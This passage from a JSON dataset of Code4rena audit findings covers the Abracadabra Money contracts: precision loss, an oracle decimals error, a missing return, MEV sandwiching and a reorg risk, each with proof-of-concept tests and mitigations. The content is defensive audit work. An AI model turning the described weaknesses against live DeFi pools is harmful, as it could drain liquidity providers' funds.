as:\n\n```Solidity\n    /*\n        Integrate dodo curve from V1 to V2\n        require V0>=V1>=V2>0\n        res = (1-k)i(V1-V2)+ikV0*V0(1/V2-1/V1)\n        let V1-V2=delta\n        res = i*delta*(1-k+k(V0^2/V1/V2))\n\n        i is the price of V-res trading pair\n\n        support k=1 & k=0 case\n\n        [round down]\n    */\n    function _GeneralIntegrate(uint256 V0, uint256 V1, uint256 V2, uint256 i, uint256 k) internal pure returns (uint256) {\n        if (V0 == 0) {\n            revert ErrIsZero();\n        }\n\n        uint256 fairAmount = i * (V1 - V2); // i*delta\n\n        if (k == 0) {\n            return fairAmount / DecimalMath.ONE;\n        }\n\n        uint256 V0V0V1V2 = DecimalMath.divFloor((V0 * V0) / V1, V2);\n        uint256 penalty = DecimalMath.mulFloor(k, V0V0V1V2); // k(V0^2/V1/V2)\n        return (((DecimalMath.ONE - k) + penalty) * fairAmount) / DecimalMath.ONE2;\n    }\n```\n\nwe can see there is a hidden division before a multiplication that makes round down the whole expression. The parameter `V0V0V1V2` is calculated in such a way that the `V0 * V0` is divided by `V1`, then the answer is divided by `V2`. After these divisions, the `penalty` variable is defined by the multiplication of `V0V0V1V2` by the `k` variable.\nThis writing method is bad as the precision loss can be significant, leading to the magic pool selling fewer base tokens than actual.\n\nAt the Proof of Concept part, we can check this behavior precisely.\n\n### Proof of Concept\n\nIf we rearrange the code in a way that the precision loss is reduced, we can see the difference:\n\n```Solidity\n    function _GeneralIntegratePrecise(uint256 V0, uint256 V1, uint256 V2, uint256 i, uint256 k) public pure returns (uint256) {\n        if (V0 == 0) {\n            revert ErrIsZero();\n        }\n\n        uint256 fairAmount = i * (V1 - V2); // i*delta\n\n        if (k == 0) {\n            return fairAmount / 1e18;\n        }\n\n        uint256 V0V0V1V2 = (V0 * V0);\n        uint256 penalty = (k * V0V0V1V2) / (V1 * V2); // k(V0^2/V1/V2)\n        return (((1e18 - k) + penalty) * fairAmount) / 1e36;\n    }\n```\n\nFor the variables:\n\n```Solidity\n    V0 = 87461235449999999000\n    V1 = 131454658215568436100\n    V2 = 45632153140140545000\n    i  = 200\n    k  = 1000000000000000000\n```\n\nWe can get these numbers:\n\n         Current Implementation  17164\n         Precise Implementation  21888\n\nThe error between these two numbers is **% 27.5**. Thus, we can see that the actual implementation calculates fewer base token amounts than the precise method.\n\n### Recommended Mitigation Steps\n\nConsider modifying the numerical integral calculation to prevent such precision loss and prioritize multiplication over division:\n\n```Solidity\n    function _GeneralIntegrate(uint256 V0, uint256 V1, uint256 V2, uint256 i, uint256 k) public pure returns (uint256) {\n        if (V0 == 0) {\n            revert ErrIsZero();\n        }\n\n        uint256 fairAmount = i * (V1 - V2); // i*delta\n\n        if (k == 0) {\n            return fairAmount / 1e18;\n        }\n\n        uint256 V0V0V1V2 = (V0 * V0);\n        uint256 penalty = (k * V0V0V1V2) / (V1 * V2); // k(V0^2/V1/V2)\n        return (((1e18 - k) + penalty) * fairAmount) / 1e36;\n    }\n```\n**[0xCalibur (Abracadabra) acknowledged](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/71#issuecomment-2025716294)**\n\n***\n\n",
      "summary": "\nThis bug report discusses a problem with the way a specific function in the code calculates the price of a token. The function uses a numerical integration method that involves dividing before multiplying, which can result in a significant loss of precision. A proof of concept is provided to demonstrate the difference between the current implementation and a more precise method. The report recommends modifying the calculation to prioritize multiplication over division to prevent this precision loss. The team has acknowledged the issue and plans to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/71",
      "tags": [],
      "finders": [
        "Matin"
      ]
    },
    {
      "id": "32068",
      "title": "[M-12] MagicLpAggregator doesn't consider the dcimal of MagicLP",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L163-L165> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/oracles/aggregators/MagicLpAggregator.sol#L37-L46>\n\nWe can know that the `MagicLpAggregator` can serve as the `price source` for `MagicLP shares` when the prices of `base` and `quote` tokens are similar.\n\n    MagicLpAggregator would be used to price MagicLP collateral for Cauldrons. \n    Something to note is that the MagicLP Oracle is only meant for closed-together price pool. \n    It's just that the oracle is not meant to be used for any kind of MagicLP, just for closely priced tokens like MIM/USDB.\n\nThere's no assurance that we can use `MagicLpAggregator` for `base` and `quote` tokens with only `18 decimals`.\nThe `MagicLP` token has the same `decimal` as the `base` token.\nHowever, the `MagicLpAggregator` does not account for this `decimal`, resulting in incorrect `prices` when the `decimal` of the `base` token is not `18`.\n\n### Proof of Concept\n\n<details>\n\nThe `MagicLP` has the same `decimal` as the `base` token.\n\n    function decimals() public view override returns (uint8) {\n        return IERC20Metadata(_BASE_TOKEN_).decimals();\n    }\n\nIn `MagicLpAggregator`, we take into account the `decimals` of the `base oracle`, `quote oracle`, `base tokens`, and `quote tokens`, but we skip the `MagicLP`.\n\n    function latestAnswer() public view override returns (int256) {\n            uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));\n            uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));\n            uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;\n\n            (uint256 baseReserve, uint256 quoteReserve) = _getReserves();\n            baseReserve = baseReserve * (10 ** (WAD - baseDecimals));\n            quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));\n            return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());\n    }\n\nAs a result, the above function will yield an incorrect `price` when the `decimal` of the `base` token is not `18`.\n\nLet's consider an example where the `decimal` of the `base` token is `12` and the `decimal` of the `quote` token is `18`.\nAdditionally, the `decimal` of the `base oracle` is `8`, and the `decimal` of the `quote oracle` is `12`.\nWe'll assume that the `price` of both tokens is `4 USD`.\nThe `prices` in `18 decimals` will be as follows:\n\n    base oracle answer           ==>   400000000            (8 decimals)\n    quote roacle answer          ==>   4000000000000        (12 decimals)\n    base oracle answer in WAD    ==>   4000000000000000000  (18 decimals)\n    quote oracle answer in WAD   ==>   4000000000000000000  (18 decimals)\n\nAnd there are `5 base tokens` and `5 quote tokens` in the `pool`.\nThe `reserves` in `18 decimals` will be as follows:\n\n    base reserves                ==>   5000000000000        (12 decimals)\n    quote reserves               ==>   5000000000000000000  (18 decimals)\n    base reserves in WAD         ==>   5000000000000000000  (18 decimals)\n    quote reserves in WAD        ==>   5000000000000000000  (18 decimals)\n\nLet's assume the total `share` of this `pool` is `5`.\n\nGiven that the `price` of the `base` and `quote` tokens is `4 USD`, the total value of all tokens will be `40 USD`.\n\n    total usd                     ==>   40000000 6\n    total supply                  ==>   5000000000000 12\n\nWith `5 shares` representing `40 USD`, the `price` of `one share` should be `8 USD`.\nHowever, the `MagicLpAggregator` returns `8,000,000 USD` because it did not consider the `decimal` of `MagicLP`.\n\n    correct answer               ==>   8000000000000000000        (18 decimals)\n    answer of aggregator         ==>   8000000000000000000000000  (18 decimals)\n\nAdd below two mock files into `test/mocks`.\n\n    pragma solidity ^0.8.13;\n\n    import {IAggregator} from \"interfaces/IAggregator.sol\";\n\n    contract OracleMock is IAggregator {\n      uint8 public decimals_;\n      uint8 public price_;\n\n      constructor(uint8 _decimals, uint8 _price) {\n        decimals_ = _decimals;\n        price_ = _price;\n      }\n\n      function decimals() external view override returns (uint8) {\n        return decimals_;\n      }\n\n      function latestAnswer() public view override returns (int256) {\n        return int256(price_ * 10 ** decimals_);\n      }\n\n      function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (0, latestAnswer(), 0, 0, 0);\n      }\n    }\n\n```\n\n    pragma solidity ^0.8.13;\n\n    import { IMagicLP } from \"/mimswap/interfaces/IMagicLP.sol\";\n    import { ERC20Mock } from \"./ERC20Mock.sol\";\n\n    contract MagicLPMock is IMagicLP {\n      address public _BASE_TOKEN_;\n      address public _QUOTE_TOKEN_;\n      uint112 public _BASE_RESERVE_;\n      uint112 public _QUOTE_RESERVE_;\n\n      constructor(ERC20Mock BASE_TOKEN, ERC20Mock QUOTE_TOKEN) {\n        _BASE_TOKEN_ = address(BASE_TOKEN);\n        _QUOTE_TOKEN_ = address(QUOTE_TOKEN);\n        _BASE_RESERVE_ = uint112(5 * 10 ** ERC20Mock(_BASE_TOKEN_).decimals());\n        _QUOTE_RESERVE_ = uint112(5 * 10 ** ERC20Mock(_QUOTE_TOKEN_).decimals());\n      }\n\n      function _BASE_TARGET_() external view returns (uint112) {\n        return _BASE_RESERVE_;\n      }\n\n      function _QUOTE_TARGET_() external view returns (uint112) {\n        return _QUOTE_RESERVE_;\n      }\n\n      function _I_() external view returns (uint256) {\n        return 1 ether;\n      }\n\n      function decimals() public view returns (uint8) {\n        return ERC20Mock(_BASE_TOKEN_).decimals();\n      }\n\n      function getReserves() external view returns (uint256 baseReserve, uint256 quoteReserve) {\n        baseReserve = _BASE_RESERVE_;\n        quoteReserve = _QUOTE_RESERVE_;\n      }\n\n      function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve) {\n        baseReserve = _BASE_RESERVE_;\n        quoteReserve = _QUOTE_RESERVE_;\n      }\n\n      function totalSupply() external view returns (uint256 totalSupply) {\n        totalSupply = 5 * 10 ** decimals();\n      }\n\n      function init(\n        address baseTokenAddress,\n        address quoteTokenAddress,\n        uint256 lpFeeRate,\n        address mtFeeRateModel,\n        uint256 i,\n        uint256 k\n      ) external {}\n\n      function sellBase(address to) external returns (uint256 receiveQuoteAmount) {}\n      function sellQuote(address to) external returns (uint256 receiveBaseAmount) {}\n      function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external {}\n      function buyShares(address to) external returns (uint256 shares, uint256 baseInput, uint256 quoteInput) {}\n      function sellShares(\n        uint256 shareAmount,\n        address to,\n        uint256 baseMinAmount,\n        uint256 quoteMinAmount,\n        bytes calldata data,\n        uint256 deadline\n      ) external returns (uint256 baseAmount, uint256 quoteAmount) {}\n      function MIN_LP_FEE_RATE() external view returns (uint256) {}\n      function MAX_LP_FEE_RATE() external view returns (uint256) {}\n    }\n```\n\nFinally please add below test into `MagicLpAggregator.t.sol`\n\n    import \"forge-std/console2.sol\";\n    import { OracleMock } from \"./mocks/OracleMock.sol\";\n    import { ERC20Mock } from \"./mocks/ERC20Mock.sol\";\n    import { MagicLPMock } from \"./mocks/MagicLPMock.sol\";\n\n    function testOracleDecimals() public {\n            IAggregator baseOracle = new OracleMock(8, 4);\n            IAggregator quoteOracle = new OracleMock(12, 4);\n\n            ERC20Mock BASE_TOKEN = new ERC20Mock(\"base\", \"base\");\n            ERC20Mock QUOTE_TOKEN = new ERC20Mock(\"quote\", \"quote\");\n\n            BASE_TOKEN.setDecimals(12);\n\n            MagicLPMock lp = new MagicLPMock(BASE_TOKEN, QUOTE_TOKEN);\n\n            MagicLpAggregatorExt mlAggregator = new MagicLpAggregatorExt(\n                lp,\n                baseOracle,\n                quoteOracle\n            );\n\n            uint256 baseOracleAnswerIn18 = uint256(baseOracle.latestAnswer()) * 10 ** (18 - baseOracle.decimals());\n            uint256 quoteOracleAnswerIn18 = uint256(quoteOracle.latestAnswer()) * 10 ** (18 - quoteOracle.decimals());\n            console2.log('base oracle answer           ==>  ', baseOracle.latestAnswer());\n            console2.log('quote roacle answer          ==>  ', quoteOracle.latestAnswer());\n            console2.log('base oracle answer in WAD    ==>  ', baseOracleAnswerIn18);\n            console2.log('quote oracle answer in WAD   ==>  ', quoteOracleAnswerIn18);\n\n            console2.log(\"\");\n            console2.log(\"**************\");\n            console2.log(\"\");\n            (uint256 baseReserves, uint256 quoteReserves) = lp.getReserves();\n            uint256 baseReservesIn18 = baseReserves * 10 ** (18 - BASE_TOKEN.decimals());\n            uint256 quoteReservesIn18 = quoteReserves * 10 ** (18 - QUOTE_TOKEN.decimals());\n            console2.log('base reserves                ==>  ', baseReserves);\n            console2.log('quote reserves               ==>  ', quoteReserves);\n            console2.log('base reserves in WAD         ==>  ', baseReservesIn18);\n            console2.log('quote reserves in WAD        ==>  ', quoteReservesIn18);\n\n            console2.log(\"\");\n            console2.log(\"**************\");\n            console2.log(\"\");\n            uint8 decimalsOfUsd = 6;\n            uint256 totalInUsd = (baseOracleAnswerIn18 * (baseReservesIn18 + quoteReservesIn18) / (10 ** 18) / (10 ** 18)) * 10 ** 6;\n            console.log('total usd                     ==>  ', totalInUsd, decimalsOfUsd);\n\n            uint256 totalSupply = lp.totalSupply();\n            uint8 decimalsOfLp = lp.decimals();\n            console.log('total supply                  ==>  ', totalSupply, decimalsOfLp);\n\n            console2.log(\"\");\n            console2.log(\"**************\");\n            console2.log(\"\");\n            uint256 correctAnswer = (totalInUsd / (10 ** decimalsOfUsd)) / (totalSupply / (10 ** decimalsOfLp)) * 10 ** 18;\n            console2.log('correct answer               ==>  ', correctAnswer);\n            console2.log('answer of aggregator         ==>  ', uint256(mlAggregator.latestAnswer()));\n    }\n\n</details>\n\n### Recommended Mitigation Steps\n\n    function latestAnswer() public view override returns (int256) {\n            uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));\n            uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));\n            uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;\n\n            (uint256 baseReserve, uint256 quoteReserve) = _getReserves();\n            baseReserve = baseReserve * (10 ** (WAD - baseDecimals));\n            quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));\n\n    +        uint256 totalSupply = pair.totalSupply() * (10 ** (WAD - baseDecimals));\n\n    -        return int256(minAnswer * (baseReserve + quoteReserve) / \n    pair.totalSupply());\n    +        return int256(minAnswer * (baseReserve + quoteReserve) / \n    totalSupply);\n    }\n\n**[0xCalibur (Abracadabra) disputed](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/90#issuecomment-2025718122)**\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `MagicLpAggregator` contract in the Abracadabra platform. The contract is used to determine the price of MagicLP shares, but it does not account for the decimals of the base tokens, resulting in incorrect prices when the base token's decimals are not 18. A proof of concept is provided to demonstrate the issue and recommended mitigation steps are suggested.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/90",
      "tags": [],
      "finders": [
        "DarkTower",
        "hals",
        "ether\\_sky",
        "SpicyMeatball"
      ]
    },
    {
      "id": "32067",
      "title": "[M-11] `MagicLpAggregator` can be incompatible with potential integrators due to incorrect `latestRoundData` function",
      "impact": "MEDIUM",
      "content": "\n`MagicLpAggregator` does not update the `roundId`, `startAt`, `updatedAt` and `answeredInRound` to correct values.\n\n[MagicLpAggregator.sol#L48-L50](https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/oracles/aggregators/MagicLpAggregator.sol#L48-L50)\n\n```solidity\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (0, latestAnswer(), 0, 0, 0);\n    }\n```\n\nA common code is to check `updatedAt` for staleness issue (although it isn't required to do so anymore.\n\n```solidity\n(, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();\n\nif (updatedAt < block.timestamp - 60 * 60 /* 1 hour */) {\n   revert(\"stale price feed\");\n}\n```\n\nTherefore any integrator that uses the above code will not be able to integrate\n`MagicLpAggregator` oracles as it will always revert due to the incorrect `updatedAt` being provided.\n\n### Recommended Mitigation Steps\n\nUse the values `roundId`, `startAt`, `updatedAt` and `answeredInRound` from whichever oracle, `baseOracle` or `quoteOracle` was used.\n\n**[rexjoseph (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/93#issuecomment-2034370525):**\n> I think we should reiterate the issue here as the submission has tried its best to point out:\n> \n> 1. The `MagicLpAggregator` gets the price from Chainlink's Feed\n> 2. Integrators (for example protocol A) query the `MagicLPAggregator` Oracle for price specifically the `latestRoundData()` function it exposes in their implementation\n> 3. They make sure the prices returned are fresh and so do well to check the time specifically `updatedAt` so they can be sure the feed is fresh to proceed with utilizing the returned data\n> 4. Since the `updatedAt` as well as other returned data are hardcoded to 0 in `MagicLpAggregator` oracle implementation, the call reverts. 0 will always be less than `block.timestamp - 60 * 60`\n> \n> \n> The step by step description of the issue above I believe is sufficient but here's a provided POC to elaborate on this in code:\n> \n> Test file in the abracadabra codebase is:  MagicLPAggregator.t.sol\n> \n> ```js\n> function testProtocolAIntegrationOfMagicLPAggReverts() public {\n> \n>         // return values of `MagicLpAggregator` latestRoundData()\n>         (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) = aggregator.latestRoundData();\n> \n>         // protocol A tries to make sure the prices returned is fresh by checking the time\n> \n>         // keep in mind the time aka updatedAt is hardcoded to 0. So 0 will always be less than `block.timestamp - 60 * 60` hence a revert\n> \n>         if (updatedAt < block.timestamp - 60 * 60 /* 1 hour */) {\n>          revert(\"stale price feed\");\n>         }\n>     }\n> ```\n> \n> ```js\n> Ran 1 test for test/MagicLpAggregator.t.sol:MagicLpAggregatorTest\n> [FAIL. Reason: revert: stale price feed] testProtocolAIntegrationOfMagicLPAggReverts() (gas: 57187)\n> Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.56s (2.88ms CPU time)\n> ```\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/93#issuecomment-2037525115):**\n > latestRoundData() is different from the standard and may cause integration issues. \n> Will consider it a valid M.\n\n\n***\n\n",
      "summary": "\nThe `MagicLpAggregator` has a bug where it does not update certain values correctly. This can cause issues for integrators who use the oracle because the values returned are always incorrect. This means that any integrator who uses the `latestRoundData()` function will not be able to integrate `MagicLpAggregator` correctly. The recommended solution is to use the values from the `baseOracle` or `quoteOracle` instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/93",
      "tags": [],
      "finders": [
        "DarkTower"
      ]
    },
    {
      "id": "32066",
      "title": "[M-10] Missing Return Statement in `_getReserves` Function in `MagicLpAggregator` Contract",
      "impact": "MEDIUM",
      "content": "\nThe `MagicLpAggregator` contract contains a flaw within the `_getReserves` function where it fails to return the reserve values fetched from the `pair` contract. This oversight results in the `latestAnswer` function always returning zero, which can have severe implications for any systems that depend on this contract for accurate liquidity pool pricing data.\n\n### Impact\n\nThe missing return statement in the `_getReserves` function leads to the `latestAnswer` function always returning zero. This affects any dependent systems or contracts that rely on accurate price data from the `MagicLpAggregator` contract, as they will receive incorrect information, potentially leading to financial loss or system failure.\n\n### Proof of Concept\n\nThe `_getReserves` function in the provided code snippet does not return the fetched reserves:\n\n```solidity\n33:    function _getReserves() internal view virtual returns (uint256, uint256) {\n34:        (uint256 baseReserve, uint256 quoteReserve) = pair.getReserves();\n35:    }\n```\n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/oracles/aggregators/MagicLpAggregator.sol#L33C5-L35C6>\n\nDue to the missing return statement, the latestAnswer function uses uninitialized variables for `baseReserve` and `quoteReserve`, which default to zero:\n\n```solidity\nfunction latestAnswer() public view override returns (int256) {\n    // ...\n    (uint256 baseReserve, uint256 quoteReserve) = _getReserves();\n    baseReserve = baseReserve * (10 ** (WAD - baseDecimals)); // baseReserve defaults to 0\n    quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals)); // quoteReserve defaults to 0\n    // ...\n}\n```\n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/oracles/aggregators/MagicLpAggregator.sol#L42C1-L44C69>\n\n### Recommended Mitigation Steps\n\nUpdate `_getReserves()`\n\n```diff\n-    function _getReserves() internal view virtual returns (uint256, uint256) {\n+    function _getReserves() internal view virtual returns (uint256 baseReserve, uint256 quoteReserve) {\n-        (uint256 baseReserve, uint256 quoteReserve) = pair.getReserves();\n+        (baseReserve, quoteReserve) = pair.getReserves();\n     }\n```\n**[0xCalibur (Abracadabra) confirmed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/146#issuecomment-2002303845):**\n > Fixed in main during the audit:\n> \n> https://github.com/Abracadabra-money/abracadabra-money-contracts\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/146)._\n\n***\n\n",
      "summary": "\nThe `MagicLpAggregator` contract has a bug in its `_getReserves` function, which causes the `latestAnswer` function to always return zero. This can have serious consequences for any systems or contracts that rely on accurate price data from this contract. The bug can be fixed by updating the `_getReserves` function as recommended in the report. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/146",
      "tags": [],
      "finders": [
        "0x11singh99",
        "bareli",
        "0xAadi",
        "hihen"
      ]
    },
    {
      "id": "32065",
      "title": "[M-09] Adjusting \"_I_\" will create a sandwich opportunity because of price changes",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/mimswap/MagicLP.sol#L470-#L510> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/mimswap/MagicLP.sol#L244-#L265>\n\nBecause `MagicLP` is forked from DODO, we will check DODO documentation to understand this contract. From [DODO documentation](https://docs.dodoex.io/en/developer/contracts/dodo-v1-v2/dodo-v1-v2-integration-guide), the \"*I*\" is the \"i\" value in here and it is directly related with the output amount a trader will receive when selling a quote/base token:\n\n![img](https://i.imgur.com/UpeLbGg.png)\n\nAdjusting the value of \"*I*\" directly by calling `setParameters()` function will influence the price. This can be exploited by a MEV bot, simply by trading just before the `setParameters()` function and exiting right after the price change. The profit gained from this operation essentially represents potential losses for the liquidity providers who supplied liquidity to the pool.\n\n### Impact\n\nSince the price will change, the MEV bot can simply sandwich the tx and get profit.\n\nAnother note on this is that even though the adjustPrice called by `onlyImplementationOwner` without getting frontrunned, it still creates a big price difference which requires immediate arbitrages. Usually these type of parameter changes that impacts the trades are setted by time via ramping to mitigate the unfair advantages that it can occur during the price update.\n\n### Recommended Mitigation Steps\n\nAcknowledge the issue and use private RPC's to eliminate front-running or slowly ramp up the \"*I*\" so that the arbitrage opportunity is fair\n\n**[0xCalibur (Abracadabra) acknowledged and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/171#issuecomment-2002305625):**\n > Fixed in main:\n> https://github.com/Abracadabra-money/abracadabra-money-contracts/\n> \n> We now have protocol own pool and can disable trading for our own pools, changing the parameters and make sure the pool is in good state before enabling it back.\n\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the `MagicLP` contract, which is based on the DODO contract. The issue is related to the `setParameters()` function, which can be exploited by a MEV bot to manipulate the price and make a profit at the expense of liquidity providers. The impact of this bug is that it allows front-running and can lead to unfair advantages for the bot. The recommended mitigation steps include acknowledging the issue and using private RPC's to eliminate front-running or slowly ramping up the parameters to ensure fair arbitrage opportunities. The issue has been acknowledged and fixed by the Abracadabra team in their main contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/171",
      "tags": [],
      "finders": [
        "blutorque",
        "roguereggiant",
        "Breeje",
        "grearlake",
        "hals"
      ]
    },
    {
      "id": "32064",
      "title": "[M-08] Factory::create() is vulnerable to reorg attacks",
      "impact": "MEDIUM",
      "content": "\nTake a look at <https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Factory.sol#L81-L90>\n\n```solidity\n    function create(address baseToken_, address quoteToken_, uint256 lpFeeRate_, uint256 i_, uint256 k_) external returns (address clone) {\n        address creator = tx.origin;\n\n        bytes32 salt = _computeSalt(creator, baseToken_, quoteToken_, lpFeeRate_, i_, k_);\n        clone = LibClone.cloneDeterministic(address(implementation), salt);\n        IMagicLP(clone).init(address(baseToken_), address(quoteToken_), lpFeeRate_, address(maintainerFeeRateModel), i_, k_);\n\n        emit LogCreated(clone, baseToken_, quoteToken_, creator, lpFeeRate_, maintainerFeeRateModel, i_, k_);\n        _addPool(creator, baseToken_, quoteToken_, clone);\n    }\n```\n\nWe can see that this function uses the `create()` logic and depends on the `tx.origin`, now Blast is suspicious of a reorg attack and protocol would be deployed on here.\n\nWhere as one can assume that the tx.origin should be different for different calls this is not really the case as going to the [Blast Explorer for transactions that are currently enqueued](https://blastexplorer.io/txsEnqueued) we can see that only two addresses are rampant as the tx.origin, i.e `0x4b16E5d33D7ab3864d53aAec93c8301C1FA4a226` and `0x6e5572f31bd9385709ec61305Afc749F0fa8fae1` what this leads is the fact that another user can just wait and due to a re-org take control of the magic lp deployment, since the tx.origin in this case would be the same with original deployer's own.\n\n### Impact\n\nNow, if users rely on the address derivation in advance or try to deploy the magiclp with the same address, any funds/tokens sent to it could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.\n\n### Recommended Mitigation Steps\n\nTry the deployment using create2 with salt that includes real `msg.sender`.\n\n**[0xCalibur (Abracadabra) acknowledged and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211#issuecomment-2000142573):**\n > This was fixed during the audit. We now use the creator address as part of the salt.\n> \n> See here:\n> https://github.com/Abracadabra-money/abracadabra-money-contracts/blob/main/src/mimswap/periphery/Factory.sol\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211#issuecomment-2027181916):**\n > https://docs.code4rena.com/roles/judges/how-to-judge-a-contest#notes-on-judging\n> > Unless there is something uniquely novel created by combining vectors, most submissions regarding vulnerabilities that are inherent to a particular system or the Ethereum network as a whole should be considered QA. Examples of such vulnerabilities include front running, sandwich attacks, and MEV. In such events, leave a comment on the issue:\n> \n> As per the c4 docs, will downgrade to QA.\n\n**[Bauchibred (Warden) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211#issuecomment-2034212115):**\n > Hi @cccz (Judge), thanks for judging, in regards to this:\n> \n> > https://docs.code4rena.com/roles/judges/how-to-judge-a-contest#notes-on-judging\n> > \n> > > Unless there is something uniquely novel created by combining vectors, most submissions regarding vulnerabilities that are inherent to a particular system or the Ethereum network as a whole should be considered QA. Examples of such vulnerabilities include front running, sandwich attacks, and MEV. In such events, leave a comment on the issue:\n> > \n> > As per the c4 docs, will downgrade to QA.\n> \n> The idea of using this rule as the grounds for downgrading this issue seems to be flawed, cause considering this rule, do we now say all front running, MEV bug ideas are invalid on Code4rena? We beg to differ as context really matters for bug cases like this.\n> \n> In fact a similar discussion around this bug case _(very similar instance)_ was held a short while ago, can be seen [here](https://github.com/code-423n4/2023-11-canto-findings/issues/313), and the deciding lines of the validity of the report not being a medium severity  was the fact that in that instance the protocol was to be deployed on Canto, and  Canto is a fork of Evmos/Ethermint, so it uses Tendermint Core BFT consensus, which provides a 1-block finality and not probabilisitic finality like other chains: https://docs.ethermint.zone/core/pending_state.html\n> \n> But that’s not the case we have here, in this case protocol is to be deployed on Blast\n> \n> 1. Blast is an optimistic rollup, just like Arbritrum, Base, Optimism, etc.\n> 2. Optimistic rollups are known for having re-org issues.\n> 3. Not all current `satisfactory` H/M issues have been fixed by the protocol, but this was not only confirmed by the protocol but also  addressed in [this commit](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211#issuecomment-2000142573), proving that this issue is of great value to them and accepted by them to be worthy a fix.\n> \n> Considering all the above arguments, we’d request a reassessment of this finding being validated as medium severity, thank you.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211#issuecomment-2037546373):**\n > These facts raise the likelihood of this issue, will reconsider it as M:\n> >1. Blast is an optimistic rollup, just like Arbritrum, Base, Optimism, etc.\n> >2. Optimistic rollups are known for having re-org issues.\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential vulnerability in the code for a protocol called Abracadabra Money. The vulnerability involves the use of a function called `create()` which relies on the `tx.origin` to deploy the protocol. However, it has been discovered that only two addresses are being used as the `tx.origin` for all transactions, which could allow someone to take control of the protocol and potentially steal user funds. The recommended mitigation step is to use a different method for deployment using a unique `msg.sender`. The protocol developers have acknowledged and fixed the issue, but there is some discussion about whether it should be considered a medium severity bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/211",
      "tags": [],
      "finders": [
        "Bauchibred"
      ]
    },
    {
      "id": "32063",
